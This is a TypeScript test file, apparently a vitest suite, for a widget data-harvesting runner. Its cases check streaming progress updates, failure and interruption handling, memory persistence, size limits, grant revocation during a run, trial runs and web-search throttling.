  const beforeChain = (list: unknown[]) => [blockStart("liste"), blockEnd("liste", list), blockStart("fiche")];
  /** Waits until `f` is true (relays are written in the background). */
  async function wait(f: () => Promise<boolean>): Promise<void> {
    for (let i = 0; i < 200; i++) {
      if (await f()) return;
      await new Promise((r) => setTimeout(r, 10));
    }
    throw new Error("attente trop longue");
  }
  const progressIsWorth = (ctx: Context, done: number) => async () =>
    (await readWidgetState(ctx.widgetsFolder, ctx.widget.id)).progress?.done === done;
  const LAST_UPDATE = "2026-10-27T08:00:00.000Z";
  async function stateBefore(ctx: Context) {
    await writeWidgetState(ctx.widgetsFolder, ctx.widget.id, { status: "ok", lastUpdate: LAST_UPDATE, lastAttempt: LAST_UPDATE });
  }

  it("two publications write data and in-progress state with progress; the end writes the final result and removes the progress", async () => {
    const ctx = await prepare("veille", "");
    await inWatch(ctx, { live: true });
    await stateBefore(ctx);
    const { clock: h, forward: advance } = movableClock();
    const seen: unknown[] = [];
    const probe = (done: number) => async () => {
      await wait(progressIsWorth(ctx, done));
      seen.push({ state: await readWidgetState(ctx.widgetsFolder, "veille"), data: await readJson(dataFile(ctx)) });
    };
    let changes = 0;
    const r = await runHarvest({
      ...optionsOf(ctx),
      clock: h,
      onChange: () => void changes++,
      launch: launcherSteps(ctx, [
        ...beforeChain([A1, A2]),
        mem(["1"]),
        pub([A1], 1, 2),
        probe(1),
        advance(5000),
        mem(["1", "2"]),
        pub([A1, A2], 2, 2),
        probe(2),
        blockEnd("fiche", [A1, A2]),
        blockStart("sortie"),
        blockEnd("sortie", [A1, A2]),
        { t: "end", data: { final: [A1, A2] } },
      ]),
    });
    expect(seen).toEqual([
      {
        state: { status: "running", lastUpdate: LAST_UPDATE, lastAttempt: NOW.toISOString(), progress: { done: 1, total: 2 }, before: { status: "ok" } },
        data: [A1],
      },
      {
        state: { status: "running", lastUpdate: LAST_UPDATE, lastAttempt: NOW.toISOString(), progress: { done: 2, total: 2 }, before: { status: "ok" } },
        data: [A1, A2],
      },
    ]);
    // Start, two publications, end.
    expect(changes).toBe(4);
    expect(r.state.status).toBe("ok");
    expect(r.data).toEqual({ final: [A1, A2] });
    expect(await readJson(dataFile(ctx))).toEqual({ final: [A1, A2] });
    const state = await readWidgetState(ctx.widgetsFolder, "veille");
    expect(state.status).toBe("ok");
    expect(state.progress).toBeUndefined();
    // The earlier state, kept during the run, does not survive its end.
    expect("before" in state).toBe(false);
    expect((await readMemory(dataOf(ctx))).liste?.value).toEqual(["1", "2"]);
  });

  it("failure after two publications: the last one stays, error state, the run's memory kept", async () => {
    const ctx = await prepare("veille", "");
    await inWatch(ctx, { live: true, maxDurationMinutes: 30 });
    await stateBefore(ctx);
    await writeData(ctx.widgetsFolder, "veille", { old: true });
    await writeMemory(dataOf(ctx), { liste: { type: "code", value: ["ancienne"] } });
    const { clock: h, forward: advance } = movableClock();
    const received: string[] = [];
    const r = await runHarvest({
      ...optionsOf(ctx),
      clock: h,
      launch: launcherSteps(
        ctx,
        [...beforeChain([A1, A2, A3]), mem(["1"]), pub([A1], 1, 3), advance(5000), mem(["1", "2"]), pub([A1, A2], 2, 3), { t: "log", block: "fiche", text: "x" }, { t: "failure", error: "cassé" }],
        { received: received },
      ),
    });
    // The maximum duration is passed: limit sent, progressive run, container stopped at 30 min + 30 s.
    expect(JSON.parse(received.join("").split("\n")[0]!)).toMatchObject({ limitMs: 1_800_000, progressive: true });
    expect(ctx.commands[0]!.slice(ctx.commands[0]!.indexOf("timeout"), ctx.commands[0]!.indexOf("timeout") + 4)).toEqual(["timeout", "-k", "5", "1830"]);
    expect(r.state).toMatchObject({ status: "error", error: "cassé", lastUpdate: LAST_UPDATE });
    expect(r.state.progress).toBeUndefined();
    expect(await readJson(dataFile(ctx))).toEqual([A1, A2]);
    const state = await readWidgetState(ctx.widgetsFolder, "veille");
    expect(state).toMatchObject({ status: "error", lastUpdate: LAST_UPDATE });
    expect(state.progress).toBeUndefined();
    // The last safe memory (not only the one relayed along the way, the first).
    expect((await readMemory(dataOf(ctx))).liste?.value).toEqual(["1", "2"]);
    expect((await readRun(dataOf(ctx), r.run!))?.status).toBe("failed");
  });

  it("F3: a publication never overwrites a state that is no longer in-progress (accord-requis written in the meantime)", async () => {
    const ctx = await prepare("veille", "");
    await inWatch(ctx, { live: true });
    await stateBefore(ctx);
    const { clock: h } = movableClock();
    let seen: unknown;
    await runHarvest({
      ...optionsOf(ctx),
      clock: h,
      launch: launcherSteps(ctx, [
        ...beforeChain([A1, A2]),
        // What refuserAccord writes during the run.
        () => writeWidgetState(ctx.widgetsFolder, "veille", { status: "grant-required", lastUpdate: LAST_UPDATE, lastAttempt: LAST_UPDATE }),
        mem(["1"]),
        pub([A1], 1, 2),
        async () => {
          await wait(async () => existsSync(dataFile(ctx)));
          await new Promise((ok) => setTimeout(ok, 50));
          seen = (await readWidgetState(ctx.widgetsFolder, "veille")).status;
        },
        { t: "failure", error: "cassé" },
      ]),
    });
    expect(seen).toBe("grant-required");
  });

  it("final data over 2 MB: memory.json stays the last memory relayed before the exit", async () => {
    const ctx = await prepare("veille", "");
    await inWatch(ctx, { live: true, maxDurationMinutes: 30 });
    await stateBefore(ctx);
    const { clock: h, forward: advance } = movableClock();
    const r = await runHarvest({
      ...optionsOf(ctx),
      clock: h,
      launch: launcherSteps(ctx, [
        ...beforeChain([A1, A2, A3]),
        mem(["1"]),
        pub([A1], 1, 3),
        advance(40_000),
        blockEnd("fiche", [A1, A2, A3]),
        blockStart("sortie"),
        blockEnd("sortie", [A1, A2, A3]),
        // Retains the keys of 2 and 3, which only the final output shows: it is refused.
        mem(["1", "2", "3"]),
        { t: "end", data: "x".repeat(2 * 1024 * 1024 + 10) },
      ]),
    });
    expect(r.state).toMatchObject({ status: "error", error: "Données trop grosses (2 Mo au plus)" });
    expect(await readJson(dataFile(ctx))).toEqual([A1]);
    expect((await readMemory(dataOf(ctx))).liste?.value).toEqual(["1"]);
  });

  it("interrupted after a publication: published data and memory kept, run interrupted", async () => {
    const ctx = await prepare("veille", "");
    await inWatch(ctx, { live: true });
    const { clock: h, forward: advance } = movableClock();
    const r = await runHarvest({
      ...optionsOf(ctx),
      clock: h,
      delayMs: 500,
      interrupted: () => true,
      launch: launcherSteps(ctx, [...beforeChain([A1, A2]), mem(["0"]), pub([], 0, 2), advance(5000), mem(["1"]), pub([A1], 1, 2), { t: "log", block: "fiche", text: "x" }], { blocked: true }),
    });
    expect(r.state.status).toBe("error");
    expect(await readJson(dataFile(ctx))).toEqual([A1]);
    expect((await readMemory(dataOf(ctx))).liste?.value).toEqual(["1"]);
    expect((await readRun(dataOf(ctx), r.run!))?.status).toBe("interrupted");
  });

  it("widget without the new fields failing: memory not written (as before)", async () => {
    const ctx = await prepare("veille", "");
    await inWatch(ctx);
    await writeMemory(dataOf(ctx), { liste: { type: "code", value: ["ancienne"] } });
    const before = await readFile(memoryFile(ctx), "utf8");
    const r = await runHarvest({
      ...optionsOf(ctx),
      launch: launcherSteps(ctx, [blockStart("liste"), mem(["1"]), blockEnd("liste", [A1]), blockStart("fiche"), { t: "failure", error: "cassé" }]),
    });
    expect(r.state.status).toBe("error");
    expect(await readFile(memoryFile(ctx), "utf8")).toBe(before);
  });

  it("widget with an account and streaming: grant removed between two publications → data erased, accord-requis, nothing written anymore", async () => {
    const ctx = await prepare("veille", "", { account: ["app.daily.dev"], public: ["127.0.0.1"] });
    await inWatch(ctx, { live: true });
    await giveGrant(ctx.widgetsFolder, "veille", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const { clock: h, forward: advance } = movableClock();
    const seen: unknown[] = [];
    const r = await runHarvest({
      ...optionsOf(ctx),
      clock: h,
      launch: launcherSteps(ctx, [
        ...beforeChain([A1, A2, A3]),
        mem(["1"]),
        pub([A1], 1, 3),
        async () => {
          await wait(progressIsWorth(ctx, 1));
          // What refuserAccord does, without the erasing: only the removal is seen by the run.
          await removeGrant(ctx.widgetsFolder, "veille");
        },
        advance(5000),
        mem(["1", "2"]),
        pub([A1, A2], 2, 3),
        advance(5000),
        mem(["1", "2", "3"]),
        pub([A1, A2, A3], 3, 3),
        async () => {
          await new Promise((t) => setTimeout(t, 150));
          seen.push({
            data: existsSync(dataFile(ctx)),
            memory: existsSync(memoryFile(ctx)),
            progress: (await readWidgetState(ctx.widgetsFolder, "veille")).progress,
          });
        },
        blockEnd("fiche", [A1, A2, A3]),
        blockStart("sortie"),
        blockEnd("sortie", [A1, A2, A3]),
        { t: "end", data: [A1, A2, A3] },
      ]),
    });
    // After the removal, neither data nor memory, and the state no longer shows any publication.
    expect(seen).toEqual([{ data: false, memory: false, progress: { done: 1, total: 3 } }]);
    expect(r.state).toMatchObject({ status: "grant-required", kernelError: true });
    expect(r.data).toBeUndefined();
    expect(existsSync(dataFile(ctx))).toBe(false);
    expect(existsSync(memoryFile(ctx))).toBe(false);
    expect(await listRuns(dataOf(ctx))).toEqual([]);
    expect((await readWidgetState(ctx.widgetsFolder, "veille")).status).toBe("grant-required");
  });

  it("a trial of an streaming widget writes neither data nor state (nor memory), even with maxDurationMinutes; limitMs sent, never progressive", async () => {
    const ctx = await prepare("veille", "");
    await inWatch(ctx, { live: true, maxDurationMinutes: 30 });
    const { clock: h, forward: advance } = movableClock();
    const real = await runHarvest({
      ...optionsOf(ctx),
      clock: h,
      launch: launcherSteps(ctx, [...beforeChain([A1]), mem(["1"]), pub([A1], 1, 1), blockEnd("fiche", [A1]), blockStart("sortie"), blockEnd("sortie", [A1]), { t: "end", data: [A1] }]),
    });
    expect(real.state.status).toBe("ok");
    const snapshot = async () => {
      const r: Record<string, { text: string; mtime: number } | null> = {};
      for (const name of ["data.json", "memory.json", "state.json"]) {
        const path = join(dataOf(ctx), name);
        r[name] = existsSync(path) ? { text: await readFile(path, "utf8"), mtime: (await stat(path)).mtimeMs } : null;
      }
      return r;
    };
    const before = await snapshot();
    expect(Object.values(before).every((f) => f !== null)).toBe(true);
    const received: string[] = [];
    advance(60_000)();
    const r = await runAttempt({
      ...optionsOf(ctx),
      clock: h,
      origin: real.run!,
      start: "fiche",
      launch: launcherSteps(
        ctx,
        [blockStart("fiche"), mem(["2"]), pub([A2], 1, 1), advance(5000), mem(["3"]), pub([A3], 1, 1), blockEnd("fiche", [A2]), blockStart("sortie"), blockEnd("sortie", [A2]), { t: "end", data: [A2] }],
        { received: received },
      ),
    });
    expect(r).toMatchObject({ ok: true, status: "succeeded" });
    const start = JSON.parse(received.join("").split("\n")[0]!);
    expect(start.limitMs).toBe(1_800_000);
    expect(start.progressive).toBeUndefined();
    expect(await snapshot()).toEqual(before);
  });

  it("web: the search starts from urlRecherche, through the given throttle", async () => {
    const BASE = "https://ddg.test/html/";
    const html = `<div class="result"><a class="result__a" href="https://a.example/1">Titre</a><a class="result__snippet">Extrait</a></div>`;
    const ctx = await prepare("veille", `export default async (w) => w.searchWeb("clio", { nombre: 1 });`);
    ctx.widget.declaration.sources.web = true;
    const pacing = new Pacing({ wait: async () => {} });
    const search = vi.spyOn(pacing, "search");
    const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: [], html: { [searchUrl("clio", BASE)]: html } } });
    const r = await runHarvest({ ...optionsOf(ctx), bridge: bridge, pacing: pacing, searchUrl: BASE });
    expect(r.data).toEqual([{ title: "Titre", url: "https://a.example/1", excerpt: "Extrait" }]);
    expect(search).toHaveBeenCalledTimes(1);
  });

  it("new ones: 3 listings of which 1 already in the previous data → 2; widget without notifier → absent", async () => {
    const code = `export default async () => [{ url: "https://a.example/1", prix: 12 }, { url: "https://a.example/2" }, { url: "https://a.example/3" }];`;
    const ctx = await prepare("annonces", code);
    ctx.widget.declaration.harvest = { minutes: 60, notify: true };
    await writeData(ctx.widgetsFolder, "annonces", [{ url: "https://a.example/1", price: 10 }]);
    const r = await runHarvest(optionsOf(ctx));
    expect(r.state.status).toBe("ok");
    expect(r.newItems).toBe(2);

    const without = await prepare("annonces", code);
    await writeData(without.widgetsFolder, "annonces", [{ url: "https://a.example/1", price: 10 }]);
    const r2 = await runHarvest(optionsOf(without));
    expect(r2.state.status).toBe("ok");
    expect(r2).not.toHaveProperty("nouveaux");
  });
});
